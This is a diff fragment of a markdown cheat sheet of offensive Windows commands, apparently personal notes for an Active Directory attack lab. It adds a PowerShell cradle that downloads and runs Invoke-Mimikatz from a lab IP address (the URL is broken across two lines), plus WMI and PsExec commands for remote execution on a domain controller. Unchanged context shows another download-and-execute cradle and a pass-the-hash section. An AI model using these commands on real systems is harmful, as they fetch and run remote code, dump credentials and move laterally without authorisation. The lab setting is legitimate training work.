@@ -33,6 +33,8 @@ Enter-PSSession -Session $sess
 Execution Cradle
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+iex (iwr http://172.16.100.134/Invoke-Mimikatz.
+ps1 -UseBasicParsing)
 ```
 
 ### Invoke Command
@@ -86,6 +88,17 @@ python open file
 python -m SimpleHTTPServer 8080
 python3 -m http.server
 ```
+
+## WMI command
+check access
+```powershell
+gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+command execute
+```cmd
+.\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local ipconfig
+```
+
 
 ## Over Pass The Hash
 PTH with mimikatz --> perform activities as the hash but Windows still think I am the same person
